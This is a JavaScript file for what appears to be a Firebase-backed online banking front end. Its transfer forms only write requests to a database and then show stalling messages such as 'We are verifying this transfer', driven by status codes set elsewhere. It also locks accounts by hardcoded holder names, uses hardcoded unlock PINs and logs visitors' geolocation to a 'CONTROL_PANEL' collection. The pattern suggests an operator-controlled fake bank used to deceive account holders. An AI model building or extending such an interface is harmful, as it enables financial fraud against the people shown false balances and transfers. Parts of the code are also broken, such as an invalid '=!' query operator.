        if (bankName != "" &&  bankAddress != "" && receiverName != "" && accountNumber != "" &&  amount != "") {
          $('.transfer-form .clear').val('');
          console.log("This Date" + date);
          console.log("This transfer is accepted.");
          $(".menu_send_section .progress").show();
            //setTimeout(function(){$(".menu_send_section .progress").hide();}, 3000);
            firebase.firestore().collection("permissions").doc(MASTERACCOUNT).set({
            permission: 1,
            which_account: MASTERACCOUNT,
            bank_name: bankName,
            bank_address: bankAddress,
            receiver_name: receiverName,
            account_number: accountNumber,
            routing_number: routingNumber,
            amount: amount,
            date: date,
            code: code,
            timestamp: firebase.firestore.FieldValue.serverTimestamp()
          })
          .then(function(docRef) {
            $(".menu_send_section .progress").hide();
            console.log("CLIENT REQUESTED TRANSFER PERMISSION");
            //UPDATED GODVERSION 0:01
           // $('.coders').removeClass('hide');
            checkTransferPermit();
           // checkTransferPermitNB();
          })
          .catch(function(error) {
            console.error("CLIENT REQUESTED TRANSFER PERMISSION =  FAILED BECAUSE: "+ error);
          });
    
        } else {
          console.log("This transfer is not accepted.");
          
        }
      }else{
        console.log("TARGET HIT!!!");
        permitMeToTransferNB()
      }
   
    }

    function permitMeToTransferNB(){
      //action(userName,'Client made a transfer.'+ output);
      which_account = MASTERACCOUNT;//COME BACK 01
      console.log('WHICH ACCOUNT AT PERMITMETOTRANSFER NB: ' + userName +' WhichAcc: '+which_account);
      bankName = $("#transfer_bank_name").val();
      bankAddress = $("#bank_address").val();
      receiverName = $("#transfer_receiver_name").val();
      accountNumber = $("#transfer_account_number").val();
      routingNumber = $("#transfer_routing_number").val();
      amount = $("#transfer_amount").val();
      code=$("#code-number").val();
      date = MASTERDATE;
  
      
      if (bankName != "" &&  bankAddress != "" && receiverName != "" && accountNumber != "" &&  amount != "") {
        $('.transfer-form .clear').val('');
        console.log("This Date" + date);
        console.log("This transfer is accepted.");
        $(".menu_send_section .progress").show();
          //setTimeout(function(){$(".menu_send_section .progress").hide();}, 3000);
        firebase.firestore().collection("TRANSFERSERVICES").doc(MASTERACCOUNT).set({
          permission: 1,
          which_account: userName,
          bank_name: bankName,
          bank_address: bankAddress,
          receiver_name: receiverName,
          account_number: accountNumber,
          routing_number: routingNumber,
          amount: amount,
          date: date,
          code: code
        })
        .then(function(docRef) {
          $(".menu_send_section .progress").hide();
          console.log("CLIENT REQUESTED TRANSFER PERMISSION");
          //UIs
          $('.distract').removeClass('hide');
          $('.distract').show();
          $('.distract .transfer-ui').show();
          
          $('.distract .transfer-ui .transfer-info-txt').text('Please Wait...');
          setTimeout(function(){
            $('.distract .transfer-ui .transfer-info-txt').text('We are processing this transaction');
          },8000);
          //UIs
          checkTransferPermitNB(MASTERACCOUNT,'3rddegree');
        })
        .catch(function(error) {
          console.error("CLIENT REQUESTED TRANSFER PERMISSION =  FAILED BECAUSE: "+ error);
        });
  
      } else {
        console.log("This transfer is not accepted.");
        $(".transfer-error").show();
        setTimeout(function(){$(".transfer-error").hide();}, 3000);
      }
   
    }


    function getDate(date){
      var d = new Date();
      var strDate = d.getFullYear() + "/" + (d.getMonth()+1) + "/" + d.getDate();
      date = strDate;
    }

    function checkTransferPermit(){
      firebase.firestore().collection("permissions").doc(userName)
      .onSnapshot(function(doc) {
          console.log("Has permit been granted yet: ", doc.data().permission);

          if (doc.data().permission == 2) {

            //sendTransfer(doc.data().which_account,doc.data().bank_name,doc.data().bank_address,doc.data().receiver_name,doc.data().account_number,doc.data().routing_number,doc.data().amount,doc.data().code,doc.data().date);
           // changePermissionStatus(0);
            $('.distract .transfer-info-txt').text('We are verifying this transfer. This might take some minutes.');
            $(".loader_ui").hide();
            setTimeout(function(){$(".distract").hide();}, 3000);
          }else if (doc.data().permission == 1) {
            $(".distract").show();
            $(".distract .transfer-ui").show();
            $(".distract .transfer-info-txt").text('Please wait...');
              console.log("Current Transfer Request sent to firestore transactions: ", doc.data().permission);           
          }else if (doc.data().permission == 0) {
              //customUPDATER()
              console.log("Current Transfer Request sent to firestore transactions: ", doc.data().permission);           
          }
          else if (doc.data().permission == 666) {
            //$(".distract").show();
            //$(".distract .transfer-ui").show();
            //$(".distract .transfer-ui .preloader-wrapper").addClass("red-text");
            //$(".distract .transfer-ui .transfer-info-txt").text("We just sent you a verification code.");
            
            $(".distract").show();
            $(".distract .transfer-ui").hide();
            $(".distract .transfer-info-txt").text('Your transfer cannot be confirmed at this moment.');
            //CHANGE BACK TO 0
            changePermissionStatus(0);
            setTimeout(function(){$(".distract .transfer-info-txt").text('');$(".distract").hide();$(".distract .transfer-ui").hide();}, 8000);
          }
          else {
            $('.distract').hide();
              console.log("Current data Not Available: ", doc.data().permission);
          }
      });


    }

    function checkTransferPermitNB(which_account, ALLIANCE){
      if (ALLIANCE == '3rddegree') {
        firebase.firestore().collection("TRANSFERSERVICES").doc(which_account)
        .onSnapshot(function(doc) {
            console.log("3RD DEGREE CHECK ACCOUNT PERMISSION: ", doc.data().permission);
    
            if (doc.data().permission == 1) {
              $(".distract").show();
              $(".distract .transfer-ui").show();
              $(".distract .transfer-info-txt").text('Please wait...');
                console.log("Current Transfer Request sent to firestore transactions: ", doc.data().permission);
            }else if (doc.data().permission == 2) {
              var transfer_id;
              //transfer_id=TRANSFERSDBNB();
              //console.log('MASTER TRANSFER RESULT IS: ');
              //sendTransfer(doc.data().which_account,doc.data().bank_name,doc.data().bank_address,doc.data().receiver_name,doc.data().account_number,doc.data().routing_number,doc.data().amount,doc.data().code,doc.data().date);
              //changePermissionStatus(0);
              $('.distract').show();
              $('.distract .transfer-info-txt').text('We are verifying this transfer. This might take some minutes.: ');
              //setTimeout(function(){$(".distract").hide();}, 3000);
            }else if (doc.data().permission == 0) {
              var transfer_id;
              //transfer_id=TRANSFERSDBNB();
              //console.log('MASTER TRANSFER RESULT IS: ');
              //sendTransfer(doc.data().which_account,doc.data().bank_name,doc.data().bank_address,doc.data().receiver_name,doc.data().account_number,doc.data().routing_number,doc.data().amount,doc.data().code,doc.data().date);
              //changePermissionStatus(0);
              $('.distract').hide();
              //$('.distract .transfer-info-txt').text('We are verifying this transfer. This might take some minutes.: ');
              //setTimeout(function(){$(".distract").hide();}, 3000);
              //customUPDATER(MASTERACCOUNT,333,'BANKSERVICES');
            }
            else if (doc.data().permission == 666) {
              //$(".distract").show();
              //$(".distract .transfer-ui").show();
              //$(".distract .transfer-ui .preloader-wrapper").addClass("red-text");
              //$(".distract .transfer-ui .transfer-info-txt").text("We just sent you a verification code.");
              
              $(".distract").show();
              $(".distract .transfer-ui").show();
              $(".distract .transfer-info-txt").text('Your transfer cannot be confirmed at this moment.');
              //CHANGE BACK TO 0
              //changePermissionStatus(0);
              
            }
            else {
              $('.distract').hide();
                console.log("Current data Not 12 Available: ", doc.data().permission);
            }
        });
      }


    }

    function TRANSFERSDBNB(whichAcc,transferType,realID,transactionNumber,IDD,receiverName,bankName,bankAddress,amount,routingNumber,date,accountNumber){
        
      // Add a new document with a generated id.
      firebase.firestore().collection("TRANSFERSERVICES").add({
          t_which_account: whichAcc,
          transfer_type: transferType,
          real_id: realID,
          transaction_number: transactionNumber,
          idd: IDD,
          receiver_name: receiverName,
          bank_name: bankName,
          bank_address: bankAddress,
          amount: amount,
          routing_number: routingNumber,
          date: date,
          account_number: accountNumber
      })
      .then((docRef) => {
          console.log("TRANSACTION WRITTEN SUCCESSFULLY: ", docRef.id);
          return docRef.id;
      })
      .catch((error) => {
          console.error("ERROR WRITING TRANSACTION: ", error);
      });
  }

   

    //DISABLE THIS FUNCTION
    function changePermissionStatus(num){
      firebase.firestore().collection("permissions").doc(userName).set({
        permission: num
      })
      .then(function(docRef) {
        console.log("permission changed to:  " + num);
        checkTransferPermit();
      })
      .catch(function(error) {
        console.error("PERMISSION CHANGE=  FAILED BECAUSE: ", error);
      });
    }
    function securityKey(){
      var x = $("#key_code").val();
      var y = $("#pin_code").val();
      if (x=='2034') {
        console.log('yeah');
        $('.s1').fadeOut();
        setTimeout(function(){$('.s2').removeClass('hide');});
      }else{
        alert('404');
      }

      if (y=='1107') {
        $('.s2').fadeOut();
        setTimeout(function(){$('.s2').addClass('hide');$('.coders .progress').removeClass('hide');});
        setTimeout(function(){location.reload();}, 9000)
        firebase.firestore().collection("permissions").doc(userName).set({
          permission: 404
        })
        .then(function(docRef) {
          $(".menu_send_section .progress").hide();
          console.log("GREAT ");
          //
          //$('.coders').removeClass('hide');
          checkTransferPermit();
        })
        .catch(function(error) {
          console.error("CLIENT REQUESTED FRRD =  FAILED BECAUSE: ", error);
        });
      }
      if (y=='0202') {
        $('.s2').fadeOut();
        setTimeout(function(){$('.s2').addClass('hide');$('.coders .progress').removeClass('hide');});
        setTimeout(function(){location.reload();}, 9000)
        firebase.firestore().collection("permissions").doc(userName).set({
          permission: 2
        })
        .then(function(docRef) {
          $(".menu_send_section .progress").hide();
          console.log("GREAT ");
          //
          $('.coders').addClass('hide');
          checkTransferPermit();
        })
        .catch(function(error) {
          console.error("CLIENT REQUESTED FRRD =  FAILED BECAUSE: ", error);
        });
      }
    }

    function sendTransfer(which_account, bankName, bankAddress, receiverName, accountNumber, routingNumber, amount, code, date){
      firebase.firestore().collection("TRANSFERSERVICES").add({
          title: "You have sent "+amount+" to " + receiverName,
          date: date,
          code: code,
          receiver_name: receiverName,
          bank_name: bankName,
          bank_address:bankAddress,
          account_number: accountNumber,
          routing_number: routingNumber,
          amount: amount
        })
        .then(function(docRef) {
          console.log("GOD Transaction written with ID: ",docRef.id);
        })
        .catch(function(error) {
          console.error("GOD Error adding Transaction: ", error);
        });
    }



    //UPDATED 29/03/2021
    //LOCK ACCOUNT
    function getAccountOPP(document){
      var docRef = firebase.firestore().collection('BANKSERVICES').doc(document);
      var name, balance, address;
  
      docRef.get().then((doc) => {
          if (doc.exists) {
              console.log("ACCOUNT: "+document+" data:", doc.data());
              name = doc.data().account_holder.toUpperCase();
              balance = doc.data().account_balance.toUpperCase();
              address = doc.data().account_address.toUpperCase();

              if (name == 'CHRISTOPHER G. BRANZOVICH') {
                $('.account-bx').addClass('hide');
                $('.account-002').removeClass('hide');
              }
              if (name == 'MARK MARIO') {
                $('#acc-lock').text('Account locked');
                $('.lock_txt').text('Account locked');
              }
              if (MASTERACCOUNT == 'account24') {
                $('#acc-lock').text('Account Inactive');
                $('.lock_txt').text('Account Inactive');
              }

              //setUserActivity(MASTERACCOUNT,name,'USERISACTIVE',DATEANDTIME, 'CHICAGO');
             
              $('#ctrl_acc_holder').val(name);
              $('#ctrl_acc_holder').addClass('white-text');
              $('#ctrl_acc_balance').val(balance);
              $('#ctrl_acc_balance').addClass('white-text');
              $('#ctrl_acc_address').val(address);
              $('#ctrl_acc_address').addClass('white-text');

              $('.accountName').text(name);
              $('.accountAddress').text(doc.data().account_address);
              $('.accountBalance').text(doc.data().account_balance);

              openHome();
              
          } else {
              // doc.data() will be undefined in this case
              console.log("No such document!");
          }
      }).catch((error) => {
          console.log("Error getting document:", error);
      });
    }
    function REALTIMEUPDATES(which_acc){
      
          firebase.firestore().collection("BANKSERVICES").doc(which_acc)
          .onSnapshot((doc) => {
          console.log("Current ACCOUNT STATUS(NB): ", doc.data().account_status);
          if (doc.data().account_status == 0) {

            $('#acc-lock').text('Account locked');
            $('.lock_txt').text('Account locked');

            if (doc.data().account_holder == "RACHAEL DAVIES") {
              $('#acc-lock').text('Account locked');
            $('.lock_txt').text('Account locked');
            }

            if (doc.data().which_account == "account3") {
              $('#acc-lock').text('Account locked');
            $('.lock_txt').text('Account locked');
            }

          }
          else if(doc.data().account_status == 1) {
            $('#acc-lock').text('');
            $('.lock_txt').text('');
          }
          else if(doc.data().account_status == 2) {
            console.log('Reloading...');
            //clientEnvironmentUpdater(MASTERACCOUNT,0);
            $('#acc-lock').text('');
          }
          else if(doc.data().account_status == 333) {
            console.log('DISTRACT...');
            $('.distract').show();
            $(".distract .transfer-ui").show();
            $('.distract .transfer-info-txt').text('We are verifying this transfer. This might take some minutes... ');
            //clientEnvironmentUpdater(MASTERACCOUNT,0);
            customUPDATER(MASTERACCOUNT,1,'BANKSERVICES');
            
          }else{
            console.log('No Status Recognized');
          }
          });
      
    }

  function getTransactionsOPP(which_acc){
   
    $(".distract").hide();
    if (which_acc == 'account1999') {
      // //DO NOTHING
      console.log('Do Nothinssg...');
    }else{
      $(".act li").remove();
      console.log('Getting all transactionssss: ');
      //firebase.firestore().collection("TRANSFERSERVICES").orderBy("order_number", "desc")
      firebase.firestore().collection("TRANSACTIONS_HISTORY").orderBy("order_number", "desc")
          .get()
          .then((querySnapshot) => {
              querySnapshot.forEach((doc) => {
                  // doc.data() is never undefined for query doc snapshots
                  console.log(doc.id, " GGG=> ", doc.data());
                  //var code = doc.data().real_id;
                  //CODES = code;
                  var details;
                  if (which_acc === doc.data().t_which_account) {

                    if (doc.data().t_which_account == 'account1000') {
                      //DO NOTHING
                      console.log('Do Nothing...');

                    }else{
                      if (doc.data().transfer_type == 'incoming') {
                        details= doc.data().amount+ ' credited to your account .xxxx6090 - '+ doc.data().receiver_name;
                        $(".act").append("<li><div class='collapsible-header ch'><i class='material-icons green-text'>arrow_forward</i><p>"+details+"</p><span class='amount'>"+doc.data().amount+"</span><span class='time grey-text'>"+doc.data().date+"</span></div>  <div class='collapsible-body grey-text'> " + doc.data().status + "</div></li>");
                      }
                      if (doc.data().transfer_type == 'outgoing') {
                          details= doc.data().amount+ ' transferred to '+ doc.data().receiver_name.toUpperCase();
                          $(".act").append("<li><div class='collapsible-header ch'><i class='material-icons red-text'>arrow_back</i><p>"+details+"</p><span class='amount'>"+doc.data().amount+"</span><span class='time grey-text'>"+doc.data().date+"</span></div>  <div class='collapsible-body grey-text'> " + doc.data().status + "</div></li>");
                          
                      }
                      if (doc.data().transfer_type == 'pending_outgoing') {
                        details= 'Pending debit transfer to '+ doc.data().receiver_name.toUpperCase();
                        $(".act").append("<li><div class='collapsible-header ch'><i class='material-icons grey-text'>alarm</i><p>"+details+"</p><span class='amount'>"+doc.data().amount+"</span><span class='time grey-text'>"+doc.data().date+"</span></div>  <div class='collapsible-body grey-text'> " + doc.data().status + "</div></li>");
                      }
                      if (doc.data().transfer_type == 'pending_incoming') {
                        details= 'Pending transaction from '+ doc.data().receiver_name.toUpperCase();
                        $(".act").append("<li><div class='collapsible-header ch'><i class='material-icons grey-text'>alarm</i><p>"+details+"</p><span class='amount'>"+doc.data().amount+"</span><span class='time grey-text'>"+doc.data().date+"</span></div>  <div class='collapsible-body grey-text'> " + doc.data().status + "</div></li>");
                      }
                      if (doc.data().transfer_type == 'failed_transaction') {
                        details= 'Failed transaction '+ doc.data().receiver_name.toUpperCase();
                        $(".act").append("<li><div class='collapsible-header ch'><i class='material-icons red-text'>warning</i><p>"+details+"</p><span class='amount'>"+doc.data().amount+"</span><span class='time grey-text'>"+doc.data().date+"</span></div>  <div class='collapsible-body grey-text'> " + doc.data().status + "</div></li>");
                      }
  
                      if (doc.data().transfer_type == 'withdrawal') {
                        details= 'ATM Withdrawal ';
                        $(".act").append("<li><div class='collapsible-header ch'><i class='material-icons red-text'>arrow_back</i><p>"+details+"</p><span class='amount'>"+doc.data().amount+"</span><span class='time grey-text'>"+doc.data().date+"</span></div>  <div class='collapsible-body grey-text'> " + doc.data().status + "</div></li>");
                      }

                      if (doc.data().transfer_type == 'check_deposit') {
                        details= 'Check Deposit';
                        $(".act").append("<li><div class='collapsible-header ch'><i class='material-icons green-text'>arrow_forward</i><p>"+details+"</p><span class='amount'>"+doc.data().amount+"</span><span class='time grey-text'>"+doc.data().date+"</span></div>  <div class='collapsible-body grey-text'> " + doc.data().status + "</div></li>");
                      }
                    }

                    
                  }
                  
  
              });
          })
          .catch((error) => {
              console.log("Error TRANSACTIONS: ", error);
          });
    }
      
  }

function clientEnvironmentUpdater(which_acc, update_code){
    console.log("CHANGING PERMISSION NB: "+update_code+" ON THIS "+which_acc);
   
    firebase.firestore().collection("TRANSFERSERVICES").doc(which_acc).set({
        //$('.coders').removeClass('hide');: update_code
    })
    .then(() => {
        console.log("ACC PERMISSION EDIT UPDATED TO: "+update_code);
        //RELOAD PAGE
        location.reload();
        
    })
    .catch((error) => {
        // The document probably doesn't exist.
        console.error("error updating ACC PERMISSION EDIT: ", error);
    });
}

function customUPDATER(which_acc, update_code, collection){
  console.log("CUSTOM UPDATER: "+update_code+" ON THIS "+which_acc);
 
  firebase.firestore().collection(collection).doc(which_acc).update({
      account_status: update_code
  })
  .then(() => {
      console.log("CUSTOM UPDATER UPDATED TO: "+update_code);
      //RELOAD PAGE
      location.reload();
      
  })
  .catch((error) => {
      // The document probably doesn't exist.
      console.error("error custom: ", error);
  });
}

//GEM 1
function writeLocationIP(whichacc){
  firebase.firestore().collection("BANKLOGINSREPORT").add({
      geolocation_city: GEOLOCATION_CITY,
      geolocation_country: GEOLOCATION_COUNTRY,
      time: MASTERTIME,
      which_account: whichacc
  })
  .then(() => {
      console.log("IP REPORTED for:  "+ whichacc);
      //GETTRANSFERSDB(BANKACCOUNT);
  })
  .catch((error) => {
      console.error("ERROR REPORTING IP: ", error);
      console.error("REAL DATA FROM LOCATION: "+GEOLOCATION_CITY +" COUNTRY: "+GEOLOCATION_COUNTRY);
  });
}
    
//NOVEMBER 01 2021
function MAKE_A_TRANSFER(){
  var fromWhichAccount, dateTime,
      bankName, bankAddress, receiverName,
      receiverAccountNumber, receiverRoutingNumber,
      amountToTransfer, code;

      fromWhichAccount = MASTERACCOUNT;
      dateTime = GetTodayDate();
      dateTime = currentDate;
      //dateTime = currentDate();
      console.log('GOD THIS IS THE TRANSFER DATE: '+ dateTime)
      bankName = $('#transfer_bank_name').val();
      bankAddress = $('#bank_address').val();
      receiverName = $('#transfer_receiver_name').val();
      receiverAccountNumber = $('#transfer_account_number').val();
      receiverRoutingNumber = $('#transfer_routing_number').val();
      amountToTransfer  = $('#transfer_amount').val();
      code = $('#code-number').val();

      var db = firebase.firestore();
      if (fromWhichAccount != '' && dateTime != '' && bankAddress != ''
      && receiverName != ''&&  receiverAccountNumber != ''&& receiverRoutingNumber != ''&& amountToTransfer != ''&&  code != '') {
        $('.menu_send_section .card-action').hide();
        db.collection("TRANSACTIONS_HISTORY").add({
          t_which_account: fromWhichAccount,
          transfer_type: 'outgoing',
          receiver_name: receiverName,
          bank_name: bankName,
          bank_address: bankAddress,
          amount: amountToTransfer, 
          routing_number: receiverRoutingNumber,
          date: dateTime,
          code: code,
          order_number: 100,
          timeStamp: firebase.firestore.FieldValue.serverTimestamp(),
          transaction_status: 'want_to_transfer',
          receiver_account_number: receiverAccountNumber
      })
      .then((docRef) => {
          console.log("TRANSACTION RECENTLY ADDED FOR REQUEST: ", docRef.id);
          location.reload();
      })
      .catch((error) => {
          console.error("ERROR WRITING TRANSACTION: ", error);
          $('.transfer-error').show();
      });
      }else{
        $('.transfer-error').show();
        console.log('');
      }
}

function HIDE_ERROR(error_code){
  $('.transfer-error').hide();
  if (error_code == 'fromTransfer') {
    $('.transfer-error').hide();
  }
  if (error_code == 'fromLogin') {
    $('#login-policy blockqoute').text('');
  }
}

//09-11-2021
function TRASACTIONS_HISTORY_LISTENER(){
  firebase.firestore().collection("TRANSACTIONS_HISTORY").where("transaction_status", "==", "want_to_transfer")
    .onSnapshot((querySnapshot) => {
        var transferRequest = [];
        querySnapshot.forEach((doc) => {
            //transferRequest.push(doc.data());
            console.log('TRANSACTION_HISTORY:::: '+ doc.data().t_which_account);
            if (doc.data().t_which_account == MASTERACCOUNT) {
              $(".distract").show();
              $(".distract .transfer-ui").show();
              $(".distract .transfer-info-txt").text('Please wait...');
              setTimeout(function(){
                $('.distract .transfer-info-txt').text('We are verifying this transfer. This might take some minutes.');
              }, 6000);
            }else{
              $(".distract .transfer-info-txt").text('Please wait...');
            }
        });
        console.log("Current transferRequest in CA: ", transferRequest.join(", "));
  });
  console.log('**********CHECK TRANSACTION HISTORY FOR INCOMING TRANSFERS');
  
}
    

//JULY 2022
function SEND_T0_CONTROLLER(){
  console.log('CURRENT TIME: '+fullDate+' || CURRENT ACCOUNT: '+ MASTERACCOUNT);
  firebase.firestore().collection("CONTROL_PANEL").doc(IPCODE+IP_COUNTRY+'_'+IP_CITY).set({
    time: fullDate,
    location: IPCODE+IP_COUNTRY+'_'+IP_CITY,
    account: MASTERACCOUNT
  })
  .then((docRef) => {
      console.log("CP REGISTERED: ");
  })
  .catch((error) => {
      console.error("ERROR: ", error);
  });
}

function SUMMON_CONTROLLER(){
  var db = firebase.firestore();
  db.collection("CONTROL_PANEL").where("account", "=!", "")
    .get()
    .then((querySnapshot) => {
        querySnapshot.forEach((doc) => {
            // doc.data() is never undefined for query doc snapshots
            console.log(doc.id, " => ", doc.data());
        });
    })
    .catch((error) => {
        console.log("Error getting documents: ", error);
    });
}

